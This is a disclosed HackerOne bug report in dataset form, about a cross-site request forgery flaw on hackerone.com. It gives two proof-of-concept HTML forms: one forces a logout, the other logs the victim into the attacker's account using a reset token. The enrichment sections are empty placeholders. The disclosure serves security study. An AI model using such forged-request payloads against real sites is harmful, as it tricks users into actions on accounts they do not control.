---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '727'
original_report_id: '727'
title: Switching the user to the attacker's account
weakness: Cross-Site Request Forgery (CSRF)
team_handle: security
created_at: '2014-01-15T22:24:14.153Z'
disclosed_at: '2014-02-20T00:04:27.563Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 24
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Switching the user to the attacker's account

## Metadata

- HackerOne Report ID: 727
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: security
- Disclosed At: 2014-02-20T00:04:27.563Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Two requests are needed to make it happen.

Request1 (log out the user):

<html>
  <body>
    <form action="https://hackerone.com/users/sign_out" method="POST">
      <input type="hidden" name="&#95;method" value="delete" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Request2 (log in the user to the attacker's account):

<html>
  <body>
    <form action="https://hackerone.com/users/password" method="POST">
      <input type="hidden" name="utf8" value="â&#156;&#147;" />
      <input type="hidden" name="&#95;method" value="put" />
      <input type="hidden" name="user&#91;reset&#95;password&#95;token&#93;" value="ENTER_HERE_RESET_PASSWORD_TOKEN_FROM_MAIL" />
      <input type="hidden" name="user&#91;password&#93;" value="ENTER_HERE_NEW_PASSWORD" />
      <input type="hidden" name="user&#91;password&#95;confirmation&#93;" value="ENTER_HERE_NEW_PASSWORD" />
      <input type="hidden" name="commit" value="Change&#32;password" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Please let me know if more detailed description is needed.

Regards,
Dawid Czagan

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
